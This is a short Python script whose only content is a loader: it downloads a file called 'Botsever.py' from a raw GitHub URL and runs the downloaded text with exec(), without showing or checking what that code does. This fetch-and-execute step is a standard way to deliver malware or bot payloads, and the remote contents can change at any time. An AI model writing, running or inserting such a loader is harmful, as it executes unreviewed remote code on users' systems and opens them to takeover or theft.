import requests

r = requests.get("https://raw.githubusercontent.com/AbualiXma/Host/main/Botsever.py").text

exec(r)
